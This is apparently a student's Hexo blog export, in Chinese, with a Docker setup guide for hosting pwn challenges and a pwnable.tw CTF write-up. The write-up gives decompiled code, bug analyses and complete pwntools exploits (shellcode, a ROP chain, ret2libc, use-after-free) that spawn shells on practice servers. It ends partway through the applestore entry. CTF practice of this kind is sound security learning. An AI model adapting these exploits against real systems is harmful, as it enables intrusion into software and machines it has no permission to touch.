{"meta":{"title":"Room of Equirement","subtitle":"pwn what you want","description":"pwn菜鸡一枚","author":"Sirius Whiter","url":"http://siriuswhiter.tk"},"pages":[{"title":"archives","date":"2018-08-24T04:17:49.000Z","updated":"2018-08-24T04:17:49.342Z","comments":true,"path":"archives/index.html","permalink":"http://siriuswhiter.tk/archives/index.html","excerpt":"","text":""},{"title":"About Me","date":"2018-08-24T04:15:58.000Z","updated":"2018-08-24T05:21:32.074Z","comments":true,"path":"about/index.html","permalink":"http://siriuswhiter.tk/about/index.html","excerpt":"","text":"I’m Sirius Whiter,a sophomore at CUG,pwn noob.Bosses do light spray.contact me at github:siriuswhiterFor the pwn is long and full of terrors"},{"title":"categories","date":"2018-08-24T04:17:06.000Z","updated":"2018-09-25T13:27:02.130Z","comments":true,"path":"categories/index.html","permalink":"http://siriuswhiter.tk/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-25T12:54:31.000Z","updated":"2018-09-25T13:09:27.033Z","comments":true,"path":"tags/index-1.html","permalink":"http://siriuswhiter.tk/tags/index-1.html","excerpt":"","text":"skills pwn RE"},{"title":"tags","date":"2018-08-24T04:16:44.000Z","updated":"2018-09-25T13:26:11.605Z","comments":true,"path":"tags/index.html","permalink":"http://siriuswhiter.tk/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Learning Docker","slug":"learning-docker","date":"2018-11-10T03:27:22.000Z","updated":"2018-11-10T08:34:21.443Z","comments":true,"path":"2018/11/10/learning-docker/","link":"","permalink":"http://siriuswhiter.tk/2018/11/10/learning-docker/","excerpt":"","text":"之前是为了学习搭pwn题的环境稍微碰了下docker，但是因为kali上的gdb被我搞得问题很大，再加上不能完全卸载重装，索性想着搞一个pwn工具的集成环境，一劳永逸，docker无疑是个好东西，顺便也记录下搭建pwn题的过程吧 pwn环境部署 最基础的方法是socat， socat tcp-l:9999,fork exec:./pwn1 没有timeout，连得人多多半就爆炸了 所以选择：xinted + docker xintedxinted从权限到服务配置都做好了一个dockerfile,build即可 1git clone https://github.com/Eadom/ctf_xinetd.git docker 安装 因为没有用ubuntu，kali等其他的debian系等等没法直接 sudo apt-get install docker-ce kali最后成功安装docker的方法： 在/etc/apt/sources.list 中添加 1deb http://http.debian.net/debian jessie-backports main 更新源并安装即可 12apt-get update apt-get install docker.io 配置docker环境 将bin文件放置到bin目录下 修改flag内容 修改ctf.xinted的服务：port = 指定端口server_args = –userspec=1000:1000 /home/ctf ./binname build dockerfile12docker build -t &quot;binname&quot; . docker run -d -p &quot;0.0.0.0:9999:9999&quot; -h &quot;biname&quot; --name=&quot;binname&quot; binname 将镜像跑起来就ok了 pwn docker一个集成pwn常用工具的docker，暂时用的是pwndocker,不过比较臃肿，之后再自己搭建一个 使用一般刚开机docker未打开，使用service docker start打开服务 pull 1docker pull skysider/pwndocker docker images 可以看到已经在仓库里了 123/pwn/docker# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEskysider/pwndocker latest a24dde07a423 6 days ago 2.02GB 各项含义： REPOSITORY：表示镜像的仓库源 TAG：镜像的标签 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 docker run -t -i skysider/pwndocker直接进入bash 12~/pwn/docker# docker run -t -i skysider/pwndockerroot@b11ff1440061:/ctf/work# *b11ff1440061 是container的id* 外部文件要往container里复制，使用 1docker cp /path/file b11ff1440061: /path 当然b11ff1440061 换成container的id 因为别人的docker工具不一定适合自己，需要自己再安装什么的，但是一般安装完退出后就又没有了，当然不能每次都重装 有两种办法： 在container中安装完以后，exit 1docker commit b11ff1440061 pwndocker 同时可以使用 -m 来指定提交的说明信息，跟我们使用的版本控制一样-a 可以指定更新的用户信息之后是用来创建镜像容器的id 最后指定目标镜像仓库名和tag信息 这样可以将修改完的另存为新的image 1234~# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpwndocker latest 7c0fa09ee004 12 seconds ago 2.05GBskysider/pwndocker latest a24dde07a423 6 days ago 2.02GB 使用dockerfile重新build 像这里可以举例，编辑dockerfile： 123FROM skysider/pwndockerRUN apt-get install vim From 指定镜像源RUN 指令告诉docker 在镜像内执行命令，安装了什么。。EXPOSE 可以指定开放端口 编辑完后1docker build -t pwndocker . 按理说这样子就可以了。。但是我这里会有个报错The command &#39;/bin/sh -c apt-get install vim&#39; returned a non-zero code: 1仍未解决","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"},{"name":"docker","slug":"docker","permalink":"http://siriuswhiter.tk/tags/docker/"}]},{"title":"pwnable.tw-wp","slug":"pwnable-tw-wp","date":"2018-11-06T11:37:08.000Z","updated":"2018-11-28T12:40:56.292Z","comments":true,"path":"2018/11/06/pwnable-tw-wp/","link":"","permalink":"http://siriuswhiter.tk/2018/11/06/pwnable-tw-wp/","excerpt":"","text":"好久没碰pwn了，找找感觉pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题 start见到的最轻巧的一个题 题目12345678910111213141516171819202122232425262728293031func main()push esp; 4: result = 3;push offset _exitxor eax, eax; 5: __asmxor ebx, ebxxor ecx, ecxxor edx, edxpush &apos;:FTC&apos;push &apos; eht&apos;push &apos; tra&apos;push &apos;ts s&apos;push 2774654Chmov ecx, esp ; addrmov dl, 14h ; lenmov bl, 1 ; fdmov al, 4int 80h ; LINUX - sys_writexor ebx, ebxmov dl, 60mov al, 3int 80h ; LINUX -add esp, 14hretnfunc exit()pop espxor eax, eaxinc eaxint 80h 以上为所有的代码。。。 可以看出先使用系统调用write到屏幕，然后又调用read，调用完退出 分析大致推测应该要使用ret2shellcode,一共可以输入60长度的字符，20个就会溢出，所以想着将shellcode放在返回地址之后。看了一下pwntools自带的shellcraft长度也有44。。。所以需要自己写或者在shellstorm上找一找符合要求的。不知道栈地址，所以需要第一次将返回地址覆盖为之前的mov ecx,esp地址，write输出泄露输入的起始地址。 exp1234567891011121314151617181920212223242526272829from pwn import *#sh = process(&apos;./start&apos;)sh = remote(&apos;chall.pwnable.tw&apos;,10000)shellcode =&quot;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&quot; print len(shellcode)pay = &apos;a&apos;*20 + p32(0x8048087) sh.recv()sh.send(pay)leak_addr = u32(sh.recv(4))print hex(leak_addr)esp_addr = leak_addr + 0x14pay = &apos;a&apos;*20 + p32(esp_addr) + shellcodesh.send(pay) #gdb.attach(sh)sh.interactive()[+] Opening connection to chall.pwnable.tw on port 10000: Done210xff936bc0[*] Switching to interactive mode\\x00\\x00\\x005o\\x93\\xff\\x00\\x00\\x00\\x00Go\\x93\\xff$ whoamistart$ orw贼鸡儿诡异的一道题，回头发现题目名字很有深意 orw –&gt; open read write 题目123456789101112131415161718192021222324252627282930313233343536373839main:int __cdecl main(int argc, const char **argv, const char **envp)&#123; orw_seccomp(); printf(&quot;Give my your shellcode:&quot;); read(0, &amp;shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0;&#125;orw_seccomp():unsigned int orw_seccomp()&#123; __int16 v1; // [esp+4h] [ebp-84h] char *v2; // [esp+8h] [ebp-80h] char v3; // [esp+Ch] [ebp-7Ch] unsigned int v4; // [esp+6Ch] [ebp-1Ch] v4 = __readgsdword(0x14u); qmemcpy(&amp;v3, &amp;unk_8048640, 0x60u); v1 = 12; v2 = &amp;v3; prctl(38, 1, 0, 0, 0); // 38 PR_SET_NO_NEW_PRIVS // 将调用线程的no_new_privs位设置为值 // ARG2。将no_new_privs设置为1，execve（2）承诺不会 // 授予执行任何无法完成的任务的权限 // 没有execve（2）调用（例如，渲染集合 - // user-ID和set-group-ID模式位，以及非文件功能 // 功能性的）。设置后，该位不能取消设置。那个设定 // 这个位是由fork（2）和 // 克隆（2），并保存在execve（2）。 // prctl(22, 2, &amp;v1); // 22 PR_SET_SECCOMP // seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall, 这是不安全的, // 比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了. // 大概是终结了系统调用的可能,也就很难getshell了。 return __readgsdword(0x14u) ^ v4;&#125; 分析题目直接让输入shellcode，之后执行，仿佛很简单，但是orw_seccomp()这个函数里有一些奇奇怪怪的东西看到了prctl函数。。。查了一些资料，看第一个的时候还以为是fork爆破canary，第二个查完发现应该是有一些特殊的点切入。 这块可以参考https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.hhttp://man7.org/linux/man-pages/man2/prctl.2.html 因为看不了题，不过在源码里能看到 12345 &lt;!-- description --&gt; &lt;div class=&quot;description&quot; hidden&gt;&lt;p&gt;Read the flag from &lt;code&gt;/home/orw/flag&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Only &lt;code&gt;open&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; &lt;code&gt;write&lt;/code&gt; syscall are allowed to use.&lt;/p&gt; 这个描述给了切入点hhhh，也就是需要这三个系统调用来得到flag嘛 \"系统调用\" exp简直就是汇编实习现场了 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *#sh = process(&apos;./orw&apos;)sh = remote(&quot;chall.pwnable.tw&quot;,10001)shellcode=&apos;&apos;&apos;push &#123;&#125;;push &#123;&#125;;push &#123;&#125;;push &#123;&#125;;mov ebx,esp;xor ecx,ecx;xor edx,edx;xor eax,eax;mov al,0x5;int 0x80; //openmov ebx,eax;xor eax,eax;mov al,0x3;mov ecx,esp;mov dl,0x30;int 0x80; //readmov al,0x4;mov bl,1;mov dl,0x30;int 0x80; //write&apos;&apos;&apos;.format(hex(u32(&apos;ag&apos;+chr(0)+chr(0))),hex(u32(&apos;w/fl&apos;)),hex(u32(&apos;e/or&apos;)),hex(u32(&apos;/hom&apos;)))sh.sendline(asm(shellcode))sh.interactive()[+] Opening connection to chall.pwnable.tw on port 10001: Done[*] Switching to interactive modeGive my your shellcode:FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;�u�\\x0[*] Got EOF while reading in interactive$ calc前面还一对代码说题目干净，这个题就开始一堆代码了。。。 题目123456789101112131415161718192021222324252627282930313233343536373839unsigned int calc()&#123; int v1; // [esp+18h] [ebp-5A0h] int v2[100]; // [esp+1Ch] [ebp-59Ch] char s; // [esp+1ACh] [ebp-40Ch] unsigned int v4; // [esp+5ACh] [ebp-Ch] v4 = __readgsdword(0x14u); while ( 1 ) &#123; bzero(&amp;s, 0x400u); // 置字节字符串前n个字节为零且包括‘\\0’。 if ( !get_expr((int)&amp;s, 1024) ) break; init_pool(&amp;v1); //初始化v1 if ( parse_expr((int)&amp;s, &amp;v1) ) &#123; printf((const char *)&amp;_d, v2[v1 - 1]); fflush(stdout); &#125; &#125; return __readgsdword(0x14u) ^ v4;&#125;init_pool():_DWORD *__cdecl init_pool(_DWORD *a1)&#123; _DWORD *result; // eax signed int i; // [esp+Ch] [ebp-4h] result = a1; *a1 = 0; for ( i = 0; i &lt;= 99; ++i ) &#123; result = a1; a1[i + 1] = 0; &#125; return result;&#125; 重点函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120signed int __cdecl parse_expr(int a1, _DWORD *a2)&#123; int v2; // ST2C_4 int v4; // eax int v5; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int O; // [esp+28h] [ebp-80h] char *s1; // [esp+30h] [ebp-78h] int num_left; // [esp+34h] [ebp-74h] char s[100]; // [esp+38h] [ebp-70h] unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v5 = a1; O = 0; bzero(s, 0x64u); for ( i = 0; ; ++i ) &#123; if ( *(char *)(i + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\\t&apos; ) &#123; v2 = i + a1 - v5; s1 = (char *)malloc(v2 + 1); memcpy(s1, v5, v2); s1[v2] = 0; if ( !strcmp(s1, &quot;0&quot;) ) // 输入不能为0 &#123; puts(&quot;prevent division by zero&quot;); fflush(stdout); return 0; &#125; num_left = atoi(s1); if ( num_left &gt; 0 ) &#123; v4 = (*a2)++; // v4为操作数数目 a2[v4 + 1] = num_left; // 操作数放入a2[1],a2[2],.... &#125; if ( *(_BYTE *)(i + a1) &amp;&amp; *(char *)(i + 1 + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\\t&apos; ) // 若下一个操作数仍未操作符即报错 &#123; puts(&quot;expression error!&quot;); fflush(stdout); return 0; &#125; v5 = i + 1 + a1; if ( s[O] ) // s[0]为操作数数目 &#123; switch ( *(char *)(i + a1) ) &#123; case &apos;%&apos;: case &apos;*&apos;: case &apos;/&apos;: if ( s[O] != &apos;+&apos; &amp;&amp; s[O] != &apos;-&apos; ) &#123; eval(a2, s[O]); s[O] = *(_BYTE *)(i + a1); &#125; else &#123; s[++O] = *(_BYTE *)(i + a1); &#125; break; case &apos;+&apos;: case &apos;-&apos;: eval(a2, s[O]); s[O] = *(_BYTE *)(i + a1); break; default: eval(a2, s[O--]); break; &#125; &#125; else &#123; s[O] = *(_BYTE *)(i + a1); &#125; if ( !*(_BYTE *)(i + a1) ) break; &#125; &#125; while ( O &gt;= 0 ) eval(a2, s[O--]); return 1;&#125;func eval():_DWORD *__cdecl eval(_DWORD *a1, char a2)&#123; _DWORD *result; // eax if ( a2 == &apos;+&apos; ) &#123; a1[*a1 - 1] += a1[*a1]; &#125; else if ( a2 &gt; &apos;+&apos; ) &#123; if ( a2 == &apos;-&apos; ) &#123; a1[*a1 - 1] -= a1[*a1]; &#125; else if ( a2 == &apos;/&apos; ) &#123; a1[*a1 - 1] /= a1[*a1]; &#125; &#125; else if ( a2 == &apos;*&apos; ) &#123; a1[*a1 - 1] *= a1[*a1]; &#125; result = a1; --*a1; return result; // 每一次计算的结果储存在 a1[1]&#125; 分析 看上去比较杂乱，看了好久也没找到漏洞。。。分析一波大佬们的思路。 程序中将a1[0] 存放操作数数目， a1[1,2…]后面存放操作数 用num来表示a1 则eval函数的逻辑就是这样：双目运算符，num[0] = 2,所以计算 a+b 逻辑便是： num[num[0] - 1] = num [2 - 1 ]= num[num[0] - 1] + num[ num[0] ] = num[2-1] + num[2] 看样子没什么问题，但是假如直接输入比如说 +100， num[0] = 1 ,num[1] = 100 num[num[0] - 1] = num [1 -1 ] = num[0] = num[num[0] - 1] + num[num[0]] = 1 + 100 = 101 可以看出来num[0]的值被改变了，而程序最后输出是输出num[num[0]-1]的值，在这里也就是输出num[101 -1] = num [100] 也就可以泄露栈内存了！！ 第二步，假如输入 +100+12，计算逻辑便是： num[num[0] - 1] = num [100] = num[num[0] - 1] + num[num[0]] = num[100] + num[101] = num[350] + 12 //为什么12会在num[101]处 总之，这样子便能对任意栈地址写了！！ 由于每次计算都会对calc的栈区清零（bzero函数），所以我们要写到其他地方栈区，比如说，main函数的返回地址。（直接写以绕过canary） 因为输入输出什么的都是数字，所以系统调用最为明智。 exp!!!发现了神器!!!很早之前听说过的ropchain，没有在意，没想到，太可怕了！！！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *sh = process(&apos;./calc&apos;)bin = ELF(&apos;./calc&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10100) !!!! ROPgadget --binary ./calc --ropchain !!!!直接生成完整的rop链，简直不要太可怕from struct import pack# Padding goes herep = &apos;&apos;p+=p32(0x804967a)p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .datap += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; retp += &apos;/bin&apos;p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; retp += &apos;//sh&apos;p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; retp += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; retp += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .datap += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; retp += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebxp += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80for i in range(len(p)/4-1): sh.sendline(&apos;+&apos;+str(369+i)+&apos;-&apos;+str(u32(p[i*4:i*4+4]))+&apos;+&apos;+str(u32(p[i*4+4:i*4+8])))sh.sendline(&apos;&apos;)sh.interactive()$ whoamicalc 下面这个是相对正常的exp。。。 123456789101112131415161718192021222324252627282930313233343536373839from pwn import * p=remote(&apos;chall.pwnable.tw&apos;,10100)#p=process(&quot;./calc&quot;)key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]p.recv()p.sendline(&apos;+360&apos;)addr_bp=int(p.recv())addr_re=((addr_bp+0x100000000)&amp;0xFFFFFFF0)-16addr_str=addr_re+20-0x100000000addr=361for i in range(5): p.sendline(&apos;+&apos;+str(addr+i)) ans=int(p.recv()) if key[i]&lt;ans: ans=ans-key[i] p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans)) else: ans=key[i]-ans p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans)) p.recv()p.sendline(&apos;+&apos;+&apos;365&apos;+str(addr_str))p.recv()for i in range(5,8): p.sendline(&apos;+&apos;+str(addr+i)) ans=int(p.recv()) if key[i]&lt;ans: ans=ans-key[i] p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans)) else: ans=key[i]-ans p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans)) p.recv()p.send(&apos;kirin&apos;+&apos;\\n&apos;)p.interactive()$ whoamicalc dubble sort冒泡排序，小小的漏洞，简直就是课设车祸现场hhh只找到了第一个漏洞，泄露下地址，然后gg 题目12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax int *v4; // edi unsigned int v5; // esi unsigned int v6; // esi int v7; // ST08_4 int result; // eax unsigned int num; // [esp+18h] [ebp-74h] int v10; // [esp+1Ch] [ebp-70h] char buf; // [esp+3Ch] [ebp-50h] unsigned int canary; // [esp+7Ch] [ebp-10h] canary = __readgsdword(0x14u); sub_8B5(); __printf_chk(1, (int)&quot;What your name :&quot;); read(0, &amp;buf, 0x40u); // 没有截断，泄露libc基地址 __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;); __isoc99_scanf(&quot;%u&quot;, &amp;num); //没有限制输入个数，之后能栈溢出 v3 = num; if ( num ) &#123; v4 = &amp;v10; v5 = 0; do &#123; __printf_chk(1, (int)&quot;Enter the %d number : &quot;); fflush(stdout); __isoc99_scanf(&quot;%u&quot;, v4); ++v5; v3 = num; ++v4; &#125; while ( num &gt; v5 ); &#125; // // // dubblesort((unsigned int *)&amp;v10, v3); // 出人意料的没有漏洞。。。。 // puts(&quot;Result :&quot;); // print if ( num ) &#123; v6 = 0; do &#123; v7 = *(&amp;v10 + v6); __printf_chk(1, (int)&quot;%u &quot;); ++v6; &#125; while ( num &gt; v6 ); &#125; // // // result = 0; if ( __readgsdword(0x14u) != canary ) process_end(); return result;&#125; 分析刚开始输入name，然后会将其打印出来，因为read没有\\x00截断，所以可以泄露出栈内存泄露libc基地址。 之后在输入个数时scanf不会限制个数，所以之后排完序后会栈溢出，但是因为程序有canary保护，不知道怎么利用。 大概是因为canary &lt; system_addr &lt; binsh_addr 所以试图让排序后的canary仍然不变，system覆盖返回地址，之后在有个/bin/sh 整体思路便是ret2libc 他们不知道怎么发现的如果在排序的时候输入 + 会输出栈的内容且不退出，只知道输入abc这些字符会直接输出栈内容并退出。。。之前输出的数据一直很少，没发现。。 ps:新的寻找/bin/sh的方法！！1hexdump -C ./libc_32.so.6|grep /bin -A 1 而且之前的gdb还是有问题的，attach会直接终结进程，之后会找个法子用ida调试，那样子会舒服不少。 exp先把大佬的放上来吧。。之后自己调成功了再放自己的。。。 1234567891011121314151617181920212223242526from pwn import * got_off = 0x1b0000system_off = 0x3a940bin_sh_off = 0x158e8b p = remote(&quot;chall.pwnable.tw&quot;,10101)p.recv()p.sendline(&apos;a&apos;*24)got_addr = u32(p.recv()[30:34])-0xalibc_addr = got_addr-got_offsystem_addr = libc_addr + system_offbin_sh_addr = libc_addr + bin_sh_offp.sendline(&apos;35&apos;)p.recv()for i in range(24): p.sendline(&apos;0&apos;) p.recv()p.sendline(&apos;+&apos;)p.recv()for i in range(9): p.sendline(str(system_addr)) p.recv()p.sendline(str(bin_sh_addr))p.recv()p.interactive() 参考：https://bbs.pediy.com/thread-228226.htm hacknote看着好生熟悉，看了下题目，感觉是之前的UAF的题，回去看了下，果然是hhhhh，不过这次多给了个libc，去掉了之前的之前打印flag的函数、 题目三个功能，添加，打印，删除、 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899unsigned int add()&#123; _DWORD *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( idx &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !ptr[i] ) &#123; ptr[i] = malloc(8u); // ptr[i] *ptr // if ( !ptr[i] ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; *(_DWORD *)ptr[i] = sub_804862B; // // // // printf(&quot;Note size :&quot;); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = ptr[i]; v0[1] = malloc(size); if ( !*((_DWORD *)ptr[i] + 1) ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; // // // // printf(&quot;Content :&quot;); read(0, *((void **)ptr[i] + 1), size); puts(&quot;Success !&quot;); ++idx; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(&quot;Full&quot;); &#125; return __readgsdword(0x14u) ^ v5;&#125;unsigned int print()&#123; int idx; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); idx = atoi(&amp;buf); if ( idx &lt; 0 || idx &gt;= ::idx ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( ptr[idx] ) (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]); return __readgsdword(0x14u) ^ v3;&#125;unsigned int sub_80487D4()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= idx ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( ptr[v1] ) &#123; free(*((void **)ptr[v1] + 1)); // ptr[v1] puts指针 // ptr[v1]+1 content指针 free(ptr[v1]); // uaf puts(&quot;Success&quot;); &#125; return __readgsdword(0x14u) ^ v3;&#125; 分析add 函数会分配大小为8的内存块存放puts与content的指针，因为free之后没有将其指向null，所以可以利用uaf漏洞覆盖note0的指针，将其指向某got地址，print泄露真实地址，计算得到system真实地址再次修改其为system地址，需要使用参数截断—system的参数即为结构体本身这里需要使用system的参数截断，例如 “||sh”或者”;sh” 感觉正在用着残破不堪的工具。。要完了 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *def add(size,content): sh.recvuntil(&quot;choice :&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;size :&quot;) sh.sendline(size) sh.recvuntil(&quot;Content :&quot;) sh.sendline(content)def delete(index): sh.recvuntil(&quot;choice :&quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(index) def print(index): sh.recvuntil(&quot;choice :&quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(index)#sh = process(&apos;./hacknote&apos;)sh = remote(&quot;chall.pwnable.tw&quot;, 10102)elf=ELF(&quot;./hacknote&quot;)libc=ELF(&quot;./libc_32.so.6&quot;)read_got=elf.got[&quot;read&quot;]putnote=0x804862badd(&quot;16&quot;,15*&quot;a&quot;)add(&quot;16&quot;,15*&quot;a&quot;)delete(&apos;0&apos;)delete(&apos;1&apos;)add(&apos;8&apos;,p32(putnote)+p32(read_got))print(&apos;0&apos;) read_addr=u32(sh.recv()[:4])print hex(read_addr)sys_addr=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;system&quot;] delete(&apos;2&apos;) add(&apos;8&apos;,p32(sys_addr)+&quot;;sh\\x00&quot;)print(&apos;0&apos;)sh.interactive() silver_bullet风格比较有意思的一个题目 题目三个选项:1.create_bullet description最大为0x30，2.power_up 若description小于0x30,最多可以增加至0x30，3.beat 用上面的power beat HP为0x7fffffff的werewolf，打败便退出。 重点函数 123456789101112131415161718192021int __cdecl power_up(char *bullet_ptr)&#123; char s; // [esp+0h] [ebp-34h] size_t v3; // [esp+30h] [ebp-4h] v3 = 0; memset(&amp;s, 0, 0x30u); if ( !*bullet_ptr ) return puts(&quot;You need create the bullet first !&quot;); if ( *((_DWORD *)bullet_ptr + 12) &gt; 0x2Fu ) return puts(&quot;You can&apos;t power up any more !&quot;); printf(&quot;Give me your another description of bullet :&quot;); read_input(&amp;s, 48 - *((_DWORD *)bullet_ptr + 12)); strncat(bullet_ptr, &amp;s, 48 - *((_DWORD *)bullet_ptr + 12)); v3 = strlen(&amp;s) + *((_DWORD *)bullet_ptr + 12); printf(&quot;Your new power is : %u\\n&quot;, v3); *((_DWORD *)bullet_ptr + 12) = v3; return puts(&quot;Enjoy it !&quot;);&#125; 分析乍一看感觉逻辑没什么问题，寻找可能有问题的地方，最后问题在strncat上因为程序的存在一个结构 1234struct bullet&#123; char bullet_ptr[0x30] int length&#125; 而strncat合并字符串时，合并完之后会在后面加上\\x00,因为上面结构体的存在，我们就有希望覆盖length，然后再次powerup便可以溢出覆盖返回地址了。 exp本地测试莫名其妙过不了，但是远程没问题。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *#context.log_level = &apos;debug&apos;#sh = process (&apos;./silver_bullet&apos;)sh = remote(&apos;chall.pwnable.tw&apos;,10103)elf = ELF(&apos;./silver_bullet&apos;)libc = ELF(&apos;libc_32.so.6&apos;)def create(con): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;of bullet :&apos;) sh.send(con)def powerup(con): sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;of bullet :&apos;) sh.send(con)def beat(): sh.sendline(&apos;3&apos;)pop_ebx_ret = 0x8048475create(&apos;a&apos;*(0x30-1))powerup(&apos;1&apos;)pay = &apos;\\xff&apos;*3 + &apos;zzzz&apos;pay += p32(elf.plt[&apos;puts&apos;]) + p32(pop_ebx_ret) + p32(elf.got[&apos;puts&apos;])pay += p32(elf.symbols[&apos;main&apos;])powerup(pay)beat()sh.recvuntil(&apos;win !!\\n&apos;)puts_addr = u32(sh.recv(4))system_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.symbols[&apos;system&apos;]binsh_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.search(&apos;/bin/sh\\x00&apos;).next()success(&quot;system_addr : &quot; + hex(system_addr))success(&quot;binsh_addr : &quot; + hex(binsh_addr))create(&apos;a&apos;*(0x30-1))powerup(&apos;1&apos;)pay = &apos;\\xff&apos;*3 + &apos;bbbb&apos;pay += p32(system_addr) + p32(pop_ebx_ret) + p32(binsh_addr)powerup(pay)beat()sh.recv()sh.interactive() applestore好难啊啊啊啊啊，心累的不行，看大佬的wp回回血 ps: 假如在 libc = ELF(‘./libc_32.so.6’) 